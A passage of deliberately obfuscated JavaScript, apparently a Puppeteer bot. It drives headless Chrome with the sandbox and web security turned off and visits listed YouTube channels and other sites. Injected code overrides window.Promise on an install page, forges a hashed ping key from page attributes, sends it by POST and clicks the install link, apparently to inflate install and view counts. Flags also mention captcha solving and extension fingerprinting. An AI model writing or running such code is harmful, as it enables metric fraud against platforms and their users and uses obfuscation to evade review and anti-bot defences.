| -0x1 * -0x1509 + -0x4b3 * -0x3 + 0xa61 * -0x3 & J['charCodeAt'](++M)), P[N >> -0x2be * -0xd + -0x4c * -0x53 + -0xf12 * 0x4] |= (-0x2c3 * -0x7 + 0x2 * 0x911 + 0x2487 * -0x1 | L >> -0xf0a + 0x2221 * -0x1 + 0x313d) << y[0x1fed + 0xef3 * -0x1 + -0x10f7 & N++], P[N >> 0x13 * 0x29 + -0x187 * 0x5 + 0x49a] |= (0x1630 + -0xb * -0x346 + 0x1a6 * -0x23 | L >> -0xdc2 + 0x32c * 0x7 + 0xd7 * -0xa & 0x138d + -0x679 * -0x1 + 0x19c7 * -0x1) << y[-0x1 * 0x667 + -0x94f * 0x2 + 0x1908 & N++], P[N >> 0x20dd + 0xc5f + -0x2d3a] |= (-0x16f * -0x7 + -0x105e * -0x1 + -0x15d * 0x13 | L >> 0x2 * -0xaa2 + -0x431 * 0x6 + 0x2e70 * 0x1 & 0x3 * 0x975 + -0x243d + -0x1 * -0x81d) << y[-0x15d9 + 0xb * -0x198 + 0x2764 & N++], P[N >> -0x416 * -0x5 + 0x1aef + -0x2f5b] |= (-0xc1b * 0x3 + 0x229f * 0x1 + -0x119 * -0x2 | 0x11 * -0x3d + -0x10de + -0x12 * -0x12d & L) << y[0x2479 + -0x92b * -0x3 + -0x3ff7 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1a71 + 0x5 * 0x66b + -0x566 ? (this['block'] = P[0x2533 + 0x232 * 0x1 + 0x1 * -0x2755], this['start'] = N - (0x7dc * -0x1 + -0x1d1d + 0x2539), this['hash'](), this['hashed'] = 0x1 * -0x701 + 0x5 * -0x3ee + -0x1 * -0x1aa8) : this['start'] = N;
                }
                return this['bytes'] > -0x7b5481c4 * -0x1 + 0x14b * -0x919525 + 0x1 * 0x140e75512 && (this['hBytes'] += this['bytes'] / (-0x4 * 0x6183e8dd + -0x1fad97380 + 0x1694134 * 0x331) << -0x16e + -0x37f * 0xa + 0x919 * 0x4, this['bytes'] = this['bytes'] % (0xdc3b1038 + 0x1fcf6080c + -0x584ad7 * 0x55c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x219b + 0xd * 0x13d + -0x1 * -0x1183;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1316 + 0x1b9c + -0x6 * 0x169] = this['block'], J[K >> 0x160 + -0x136e * 0x2 + -0x12bf * -0x2] |= x[-0xac + -0xc21 * -0x3 + -0x4 * 0x8ed & K], this['block'] = J[-0x1 * 0xde5 + -0x3 * -0x9d9 + -0xf96], K >= 0x17fd + 0x1d9 * -0xb + -0x372 && (this['hashed'] || this['hash'](), J[-0x41d + 0x1969 + 0x1d * -0xbc] = this['block'], J[0x1 * -0x1f22 + 0x1 * -0x58f + 0x24c1] = J[-0x1 * 0x89e + 0x18e6 + -0x1 * 0x1047] = J[-0x3 * -0x3bc + 0x24b4 + -0x2fe6] = J[0x1 * 0x21da + -0x173a + -0xa9d] = J[0x1 * -0x263f + 0x1 * -0xdb5 + 0x33f8] = J[0x1975 * -0x1 + 0x1209 + 0x771] = J[-0x20a1 * -0x1 + -0x985 + -0x1716] = J[-0xb0 + -0x29 * -0x2c + -0x655] = J[0x22e4 + -0x71b * 0x2 + -0x14a6] = J[-0x25f6 + -0x1e88 + 0x14b * 0x35] = J[0x1147 * 0x1 + -0x243b + 0x12fe] = J[0x1d1f + -0x2443 + 0x72f] = J[0x8 * 0x47d + -0x1ad4 + -0x44 * 0x22] = J[-0x8a4 * 0x2 + -0x3 * 0x3f5 + 0x1d34] = J[-0xf0c + 0x1ecb + -0x1 * 0xfb1] = J[0x29d * 0x8 + 0x8c3 * -0x1 + -0xb6 * 0x11] = 0x1795 * -0x1 + -0x18f5 + 0x308a), J[0x3d2 * 0x2 + 0x53 * 0x29 + -0x1 * 0x14e1] = this['hBytes'] << -0x432 * -0x6 + -0x3e * -0xa + -0x1b95 | this['bytes'] >>> -0x1 * -0x36f + -0x1 * -0x1d3c + -0x208e * 0x1, J[-0x83 * -0x1 + 0x1 * -0x1349 + 0x3 * 0x647] = this['bytes'] << 0xa3a + 0x1 * -0x1a75 + 0x252 * 0x7, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0xb2 * 0xd + -0xc57 + -0x1 * -0x1571; J < -0x8da + -0x5 * 0x72b + 0x2d01; ++J)
                K = Q[J - (-0x43 * -0xe + 0x1 * -0xb3 + -0x2f4)] ^ Q[J - (-0x8f9 * -0x1 + -0x22d4 + 0x8a1 * 0x3)] ^ Q[J - (-0x1 * 0xaed + -0x774 + -0x79 * -0x27)] ^ Q[J - (-0x327 + -0x3b + 0x372)], Q[J] = K << -0x1c3 + 0x9b7 + -0x7f3 * 0x1 | K >>> -0x8 * 0x474 + -0x471 * 0x1 + 0x10 * 0x283;
              for (J = 0x1e2e + -0x151c + -0x912; J < -0x8d * 0x3 + 0x1585 + 0x12a * -0x11; J += 0x130f + -0x8d * -0x45 + 0x1 * -0x390b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x131 * 0x5 + 0x2f * -0x71 + 0x1ab9 | L >>> -0x173f + 0x2ef * -0x2 + 0x1d38) + (M & N | ~M & O) + P + (0x9feb459 * -0x3 + -0x78a9353 + 0x7881187 * 0x11) + Q[J] << -0xe7b * -0x2 + 0xa9c + -0x2792) << 0xc * -0x15d + 0x28 * 0x17 + 0xcc9 | P >>> 0xc69 + -0x1c3c + -0x7f7 * -0x2) + (L & (M = M << 0x1a03 + -0x3b3 * -0x2 + -0x1 * 0x214b | M >>> -0x1e2d + 0x157c + 0x8b3) | ~L & N) + O + (-0x50501757 + -0xe65c2 * -0x82c + 0x352b0398) + Q[J + (0x1c4f * -0x1 + 0x1dec + 0x67 * -0x4)] << 0x15b * -0x5 + -0xf * -0x17f + -0x191 * 0xa) << -0xb * 0x2c + -0x9 * 0x27b + 0x183c | O >>> 0x35 * 0x6f + -0x20d8 + 0x9f8) + (P & (L = L << 0x1b32 + 0x1 * -0xb89 + -0xf8b | L >>> -0xa00 + 0x34 * -0x3 + 0xa9e) | ~P & M) + N + (0x8ef6582f + -0x6389 * 0xc2b6 + -0x19fe9 * -0xe50) + Q[J + (-0x13b6 + -0x3 * 0x22 + 0xce * 0x19)] << -0x18f2 + 0x186d + -0x85 * -0x1) << 0x111e * 0x1 + -0x210c + 0xff3 | N >>> 0x59 + 0x1294 * -0x2 + -0x276 * -0xf) + (O & (P = P << -0x1a3d + -0x1835 + 0x3290 | P >>> 0x16 * -0xf1 + 0x2246 + -0xd8e) | ~O & L) + M + (-0x373 * 0x22af61 + 0x382 * -0x1a843d + 0xb * 0x1b8f6332) + Q[J + (0xcd * 0x1d + -0xcad + -0xa89)] << -0x1de7 + -0x1 * -0x2f + 0xedc * 0x2) << -0x608 + 0x1219 * 0x1 + 0x6 * -0x202 | M >>> 0x1 * -0x23a7 + 0x257e + -0x1bc) + (N & (O = O << 0xbf7 + 0xfbf + -0x1b98 | O >>> -0x1 * 0x2d4 + -0x1b33 + 0x1e09) | ~N & P) + L + (0x586640a + 0x1751c620 + -0x3daa4f6f * -0x1) + Q[J + (0x1 * -0x4db + -0x27e * -0x5 + -0x797 * 0x1)] << 0x24c5 * 0x1 + 0xc67 + -0x312c, N = N << -0x1ba9 + -0x6f2 + 0x22b9 | N >>> 0xa7f * -0x3 + 0x1f5b + 0x24;
              for (; J < -0x721 * -0x1 + -0x62b * 0x3 + 0xb88; J += 0x1750 + -0x1809 + 0xbe)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1046 + 0x3 * -0xcb9 + 0x3676 | L >>> 0x9ff + 0x851 * -0x1 + -0x193) + (M ^ N ^ O) + P + (0x4bb185e6 + -0x2cdb3c97 + 0x5003a252) + Q[J] << -0x2 * 0x7e2 + 0xcb7 + 0x30d) << -0x1324 + 0x6 * 0x10f + 0xccf | P >>> 0x1b * -0x4 + 0x1831 + -0x1d2 * 0xd) + (L ^ (M = M << -0x2189 + -0x1103 + 0x1 * 0x32aa | M >>> 0x3 * -0x86d + 0x355 + -0x1 * -0x15f4) ^ N) + O + (0x97429 * -0x84e + 0xa718e8bc + 0x1643af63) + Q[J + (-0x230d + -0xefd + 0x320b)] << -0xf2 + -0x1a06 + -0x1af8 * -0x1) << 0x3d * 0x5 + 0x2122 + -0x224e * 0x1 | O >>> -0xc80 + 0x1c11 + -0xf76 * 0x1) + (P ^ (L = L << -0x1649 + -0x1a17 * 0x1 + 0x307e | L >>> 0x1e74 + 0x2d * -0x86 + 0x54 * -0x15) ^ M) + N + (0x60adad * 0x142 + -0x3 * 0x49aff57e + 0xd24f5881) + Q[J + (-0xf28 + -0x16f5 * -0x1 + -0x7cb)] << -0xaef + -0x19a * -0x11 + 0x1 * -0x104b) << 0x1072 + -0xe5a + -0x213 | N >>> -0x2 * 0x4d6 + 0x1 * -0xc37 + 0x2 * 0xaff) + (O ^ (P = P << 0x6 * -0x38f + 0xbf * 0x14 + 0x68c | P >>> 0x23f9 + -0x4 * 0x836 + -0x31f) ^ L) + M + (0x58c4e3c * -0x8 + -0x11293 * 0xb23f + -0x1452a * -0x110bb) + Q[J + (-0x128c + 0x71a * 0x3 + -0x2bf)] << 0x1283 * -0x1 + -0xad5 + -0x4e4 * -0x6) << -0x1986 + -0xd * 0x2bb + 0x3d0a * 0x1 | M >>> -0x29 * -0x4f + 0x1 * -0xac1 + -0x1cb) + (N ^ (O = O << 0x20 * 0xa1 + 0x8f5 * 0x4 + -0x37d6 | O >>> -0x7 * 0x570 + -0x1302 + 0x3914) ^ P) + L + (0x13 * 0xa226a51 + 0xa3c30d6f + -0xf57705d1) + Q[J + (-0x65f * -0x4 + 0x256d + -0x3ee5)] << -0x1e71 + -0x1 * 0x171 + -0x247 * -0xe, N = N << 0x1cd + -0x1c86 + 0x1 * 0x1ad7 | N >>> 0x1228 + -0x1 * 0x2ab + -0x1 * 0xf7b;
              for (; J < -0xf0f + -0x1 * 0x1b0f + 0x2a5a; J += 0x7a2 * -0x2 + 0x6 * -0x504 + 0x2d61)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x2609 + 0x1fd8 + -0x45dc | L >>> 0x306 + -0x1 * -0x3c2 + -0x6ad) + (M & N | M & O | N & O) + P - (0x7fe81c30 + 0x94445 * 0x16ae + -0xe12e2df2) + Q[J] << -0x1dcf + -0x151 + 0xa6 * 0x30) << -0xfa * -0x1c + -0xb16 + -0x103d * 0x1 | P >>> -0xb3b + -0x17e1 + 0x2337) + (L & (M = M << 0x181d + 0x500 * -0x7 + -0x3ab * -0x3 | M >>> 0xcb1 + 0x2556 + -0x3205) | L & N | M & N) + O - (0x28 * -0x337c67a + -0x1f034d0c + 0x1109e9340) + Q[J + (-0x1 * -0x128d + 0x1b00 + -0x109 * 0x2c)] << -0x50 + 0x117 + -0xc7) << 0xae5 + 0x1 * 0xfb + -0xbdb | O >>> 0x41 * 0x13 + 0x1fba + 0x2472 * -0x1) + (P & (L = L << -0x15e6 * 0x1 + -0x1b73 + 0xc9 * 0x3f | L >>> 0x15e7 + 0x16f3 * -0x1 + -0x3 * -0x5a) | P & M | L & M) + N - (0x6 * 0x2a4af1 + 0x4adb5dcd * -0x2 + -0xbc * -0x1643d9a) + Q[J + (-0x2 * -0x32 + 0x5db + -0x63d)] << -0x7d0 + 0x11 * 0x4e + -0x2 * -0x151) << 0xdac + -0xc42 * 0x1 + -0x165 | N >>> 0xfc8 + 0x794 + 0x1 * -0x1741) + (O & (P = P << -0x2 * -0x6a3 + -0x1d * 0x95 + 0x1 * 0x3b9 | P >>> -0x23eb + -0x4d4 * 0x5 + 0x3c11) | O & L | P & L) + M - (0x13567 * 0x792b + -0x923a54a1 + -0x28f911a * -0x2c) + Q[J + (0x2de + 0x548 + -0x823)] << 0xe9d + 0x317 * -0x1 + -0x1 * 0xb86) << 0x1594 * 0x1 + 0xbb2 + -0x1 * 0x2141 | M >>> -0x1d * 0xa + -0x20ed + 0x222a) + (N & (O = O << -0x1e57 + -0xda * 0x4 + 0x21dd | O >>> 0x10b5 * -0x1 + 0x570 + 0xb47) | N & P | O & P) + L - (0x1193f * -0xa24f + -0x8107b7ef + 0x1a43ca384) + Q[J + (-0x1f44 + 0x1 * 0x25be + -0x676)] << -0x7 * 0x2e2 + -0x3 * -0xc5b + 0x5a1 * -0x3, N = N << 0x2 * -0x41e + 0x1 * 0x111b + -0x9 * 0xf9 | N >>> 0x26 * 0x2a + -0x3ea + -0x250;
              for (; J < -0x1e7d + 0x16b2 * 0x1 + 0x81b; J += 0x444 + 0x1 * 0x5ab + 0x11a * -0x9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x19aa + -0x585 * -0x2 + -0x24af | L >>> 0x18ea + 0x73c * 0x5 + -0xe9 * 0x43) + (M ^ N ^ O) + P - (-0x1 * -0x710143 + 0x2e3835b2 + 0x6f40735) + Q[J] << -0xc48 + -0x2228 + 0x1 * 0x2e70) << -0x3a8 + 0xc83 + -0x4e * 0x1d | P >>> -0x16ee + 0xbb * -0x13 + -0x5a * -0x69) + (L ^ (M = M << 0x1 * 0xb23 + 0x209 * 0xe + 0x121 * -0x23 | M >>> 0xff5 + 0xc94 + -0x1c87) ^ N) + O - (0xae5cc4a + -0x66b3a771 * -0x1 + -0x1 * 0x3bfc3591) + Q[J + (-0x79f * 0x3 + 0x708 + 0x1 * 0xfd6)] << -0x820 * 0x2 + 0x1dee + -0xdae) << -0x1 * 0x81b + -0x84 * 0x4b + 0x2ecc | O >>> -0x2 * 0x12c4 + -0x1e2 * 0x1 + 0x2785) + (P ^ (L = L << 0x212 + -0x2083 + 0x1e8f | L >>> 0x8 * 0xe + 0x1 * -0x106 + 0x4c * 0x2) ^ M) + N - (-0x225f05bd + 0x4a2d39a4 + 0xdcf0a43) + Q[J + (0x20fb * 0x1 + -0x12ec + -0xe0d)] << -0x3 * -0x915 + 0x5a7 * -0x3 + 0x1b7 * -0x6) << 0x2 * 0x740 + 0x1 * -0x15cd + -0x2 * -0x3a9 | N >>> -0x146 * -0x8 + -0x268 * 0xd + 0x1533 * 0x1) + (O ^ (P = P << 0x930 + 0x228d + -0x2b9f | P >>> -0x3ee * -0x9 + 0x21e0 + 0x15 * -0x34c) ^ L) + M - (-0x1c65fb6d * -0x3 + -0x550d99c4 + 0x3578e5a7 * 0x1) + Q[J + (0x2310 + -0x3 * -0xff + 0x43a * -0x9)] << 0xfe9 + -0x255 + -0x9e * 0x16) << 0x10ba + 0x3d4 + -0x1489 | M >>> 0x179a + 0xdf * 0x3 + -0x1a1c) + (N ^ (O = O << -0x17e * -0x1 + 0x1177 + -0x12d7 | O >>> -0x16ef + -0xfd7 + 0x26c8) ^ P) + L - (-0x2 * 0x4f79857 + 0x8 * -0xcddbbcb + -0xd4 * -0xc9079c) + Q[J + (0x1 * -0x26f6 + 0x883 * -0x1 + 0x2f7d)] << -0x1 * 0xc73 + 0xc49 + -0xe * -0x3, N = N << -0x1 * -0x83 + -0x1 * 0x311 + 0x2ac | N >>> -0x218b + 0x87 + -0x3 * -0xb02;
              this['h0'] = this['h0'] + L << 0x121a + 0x10c3 + 0xff * -0x23, this['h1'] = this['h1'] + M << 0x55a + -0x9 * -0x371 + 0x2453 * -0x1, this['h2'] = this['h2'] + N << 0x1 * -0xa42 + -0xff * 0x26 + 0x301c, this['h3'] = this['h3'] + O << -0x681 + -0x1 * -0xcf4 + -0x673, this['h4'] = this['h4'] + P << 0x12 * 0x20 + -0x4b2 * 0x8 + -0x388 * -0xa;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2ea + -0x67 * 0x23 + 0xb47 * 0x1 & 0x35f + 0x159a * 0x1 + 0xc75 * -0x2] + w[J >> 0x89 * -0xb + -0x3df * 0x1 + 0x9da & 0x8 * 0x2ef + -0x1c77 + 0x50e] + w[J >> 0x336 + 0x59f * -0x2 + 0x81c & 0x1bf1 * -0x1 + -0x267b + -0x1 * -0x427b] + w[J >> 0x1d04 * 0x1 + -0x1 * -0x4 + -0x1cf8 & 0xe4e + 0xc9e + -0x1add] + w[J >> -0x2 * 0x96 + -0x65 * 0x2f + 0x1 * 0x13c3 & -0x2 * 0x49d + 0x7cc + 0x17d] + w[J >> -0xcb * 0x8 + -0xed * -0x4 + 0x2ac & 0x290 + 0x1ea1 + -0x2122] + w[J >> 0x4 * 0x577 + 0x1289 + -0x2861 * 0x1 & 0x1481 + -0x55 * 0xb + -0x10cb * 0x1] + w[-0xe10 + -0x2b0 + 0x10cf & J] + w[K >> 0x7d3 + -0x1d * -0xd5 + -0x1fd8 & 0x97 * 0x1d + 0x265e + -0x376a * 0x1] + w[K >> -0x11f7 + -0x1e58 + -0x3067 * -0x1 & -0x115 * -0x11 + -0x32e * 0x7 + 0x1 * 0x3ec] + w[K >> -0x21c6 + -0x18af + 0xb9 * 0x51 & -0xabe + 0x1e69 + -0x139c] + w[K >> -0x19b5 + -0x1e33 + 0x37f8 & -0x1d8c + -0x4 * -0x99f + -0x8e1 * 0x1] + w[K >> 0x23a + -0x1137 + 0xf09 & -0x16fd + 0x17d + 0x1 * 0x158f] + w[K >> 0x2e * -0xc + 0x1 * -0xd2a + 0xf5a & 0x230d + 0xbb * -0x22 + -0xa28] + w[K >> 0x1556 + -0xad3 * 0x2 + 0x54 & -0xa4b + -0xe5b * 0x1 + -0x23f * -0xb] + w[0x1 * 0x197e + 0x644 * -0x1 + 0x1 * -0x132b & K] + w[L >> -0x90a + 0x13d0 * 0x1 + -0xaaa & -0x1362 * 0x2 + -0x200d + 0x46e0] + w[L >> -0x238e + 0x662 + 0x1d44 & -0xc27 + 0x1 * 0xf65 + 0x1 * -0x32f] + w[L >> -0x8cd * 0x1 + 0x51e + -0x9 * -0x6b & -0x1 * 0x24e8 + 0x1544 + 0xfb3] + w[L >> -0x1b31 * 0x1 + 0x21cf + 0x1 * -0x68e & 0x25c + -0x24a7 + 0x225a] + w[L >> -0x2 * 0xb07 + -0xb * 0x373 + 0x3c0b & 0x1064 * -0x2 + -0x491 * 0x5 + 0x7 * 0x7f4] + w[L >> -0x31a + -0x66 * -0x11 + -0xe9 * 0x4 & -0x6f3 + -0x1 * 0x587 + 0xc89] + w[L >> -0x15f2 + -0x791 + 0x1d87 * 0x1 & -0x5e * 0x39 + 0x1836 + 0x19 * -0x21] + w[-0x91c + -0x1555 * 0x1 + -0x3d * -0x80 & L] + w[M >> 0x1 * -0x1e6a + 0x942 + 0x1 * 0x1544 & -0x283 + -0x2c * 0x58 + 0x2f3 * 0x6] + w[M >> -0x3 * -0x46a + -0xa77 + -0x2af & -0x3 * 0x796 + 0x8db + 0xdf6 * 0x1] + w[M >> 0x1625 * -0x1 + 0x1 * -0x25c5 + 0x3bfe & 0x1b3b * -0x1 + 0x1 * -0x15 + 0x1b5f] + w[M >> -0x1957 + -0x19df + 0x3346 & 0x6da + -0x2059 + 0x198e] + w[M >> 0x1173 + 0x12e4 + -0x244b & 0x1044 * 0x1 + 0x45 * 0x43 + 0xac * -0x33] + w[M >> 0x2563 * -0x1 + 0x36f * -0x9 + 0x4452 & -0x20a0 + -0xe * 0x127 + -0x30d1 * -0x1] + w[M >> -0x369 * -0x6 + 0x3 * 0xaa7 + -0x3467 & -0x22d7 + 0x1 * 0x1251 + 0x11b * 0xf] + w[-0x1fa5 + -0x1465 + 0x3419 * 0x1 & M] + w[N >> -0x53f + 0xb03 + -0x5a8 & -0x3df * 0x5 + 0x151 + 0x1219] + w[N >> -0x164 * -0xa + -0x1 * 0xb32 + 0x1 * -0x29e & -0x1a6a + -0x1dd9 + 0x9 * 0x642] + w[N >> 0x1d57 + 0x1 * 0x4c1 + 0x7 * -0x4dc & 0x1065 + 0x17da + -0x2830] + w[N >> 0x1f8d * 0x1 + 0x1158 * 0x1 + 0x1047 * -0x3 & -0x2 * -0xa7d + -0x1 * -0x16f4 + 0xb * -0x3fd] + w[N >> -0xefc + 0x266d + -0x1765 & 0x1a * -0xdd + -0x23e8 + -0x3a69 * -0x1] + w[N >> 0x3b * -0x7b + 0x2 * -0x426 + 0x24ad & -0x94 * 0xd + -0xb58 + 0x12eb * 0x1] + w[N >> -0x1bdf + 0x2b0 * -0xe + 0x4183 & -0xb * -0x137 + -0xb93 + -0x1bb] + w[0x4f * -0x4d + -0x20f4 + 0x38c6 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x26 * 0x55 + 0x5e6 + 0x6d0 & -0x203b + 0x23fb + -0x8d * 0x5,
                J >> 0x14 * -0x125 + -0x137f + -0x1 * -0x2a73 & -0x2 * 0x944 + -0xfae + 0x2335,
                J >> -0x6 * -0x5e5 + -0x13 * -0x20b + -0x4a27 & -0x50e * -0x5 + 0x71f * 0x5 + -0x3be2,
                0x2 * 0x11 + -0x7f3 + 0x11a * 0x8 & J,
                K >> 0xf70 + 0x2 * 0x25 + -0xfa2 & 0x2 * 0x121b + 0x23b4 + -0x46eb,
                K >> -0x893 * -0x1 + -0x18 * 0x6e + 0x1cd & 0x148 * -0x1 + 0x34 * -0x97 + 0x4b5 * 0x7,
                K >> -0xf4d + 0x1cca + -0x2b1 * 0x5 & 0x35b * 0x4 + -0x9 * 0x3c1 + -0x155c * -0x1,
                0x1753 * 0x1 + -0x184e + 0x1fa & K,
                L >> 0x18cb + 0x18b2 + -0x3 * 0x1077 & 0x3a * -0x1f + 0x1bbe + -0x13b9,
                L >> 0xe2f * -0x1 + -0x6 * -0x1 + 0xe39 & 0x55 * -0x6f + 0x71f * 0x3 + 0x107d,
                L >> 0x7 * -0x240 + 0x1 * 0x5e7 + 0x9e1 & 0x5b * 0x67 + 0x1b0f + -0x3ead,
                -0x995 * 0x1 + -0x1 * -0x1f57 + -0x14c3 & L,
                M >> -0x3e2 + 0x18d5 + -0x14db & -0x20 * 0x78 + 0x20 * -0x12f + 0x1 * 0x35df,
                M >> 0x7 * 0xdc + 0xef * 0xb + -0x1039 * 0x1 & -0xcd2 + 0x1f72 + -0x11a1 * 0x1,
                M >> 0x1fc * -0x2 + -0x1f0f + 0x230f & 0x4 * -0x3c9 + -0x59 * 0x11 + 0x53 * 0x44,
                -0x2401 * 0x1 + 0x39f + 0x6ad * 0x5 & M,
                N >> 0x1350 + -0x3fd * 0x5 + -0x1 * -0xb9 & 0x2 * -0x4f8 + -0xe46 + 0x1935,
                N >> -0xa1f * 0x1 + 0xc25 * 0x3 + 0x23 * -0xc0 & -0xb * -0xcd + 0x1 * -0x125e + -0x182 * -0x7,
                N >> 0x3b * -0x3d + 0x8f4 + -0x523 * -0x1 & 0x8 * -0x1d3 + 0x23b6 + -0x141f * 0x1,
                -0xea4 + -0x32f * 0x3 + 0x34 * 0x7c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1e18 + -0x709 * 0x5 + 0x4159 * 0x1), (K = new DataView(J))['setUint32'](0x16bb + 0x212 + 0x18cd * -0x1, this['h0']), K['setUint32'](-0xdd * -0x1a + 0x2 * 0x707 + -0x247c, this['h1']), K['setUint32'](-0x3fd * 0x4 + -0x1 * 0x1a5e + 0xe1e * 0x3, this['h2']), K['setUint32'](-0x3e7 + -0x3e4 + 0x7d7, this['h3']), K['setUint32'](-0x5 * 0x191 + -0x1 * -0xce + 0x717, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1f3 * -0x13 + 0x2 * 0x527 + -0x2f57];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x51 + -0xa1 + -0x1 * -0xf2;
            J[-0x781 * -0x3 + 0x11 * -0x140 + -0x143]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x57b + -0x61e + 0xa3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2 * -0x36a + 0x22d * -0x5 + 0x1 * 0x11b6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x241f * -0x1 + 0x8 * -0x1f9 + -0x1456;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xb13 + -0xb * 0x1 + 0x14b * -0x4), Promise['resolve'](-0x12a + 0xa42 + -0x1 * 0x917);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x30a * -0xc + 0xb37 + 0x1941; j < 0x1bfb + 0x9 * 0x3de + -0x3ec8; j++)
    i();
}
const NETWORK_PATIENCE = 0x25fb + -0x160d + -0x2 * -0x7a9 + (-0x24d + 0xd27 * -0x1 + -0x25 * -0xbc) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2461 * -0x1 + 0x18 * -0x105 + 0x3cdc) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      X(0x15, 'V(yN') + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x3 * -0x48a + 0x2 * 0xd9f + -0x28dc; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const Y = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this[Y(0x1a, 'a77Z')])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
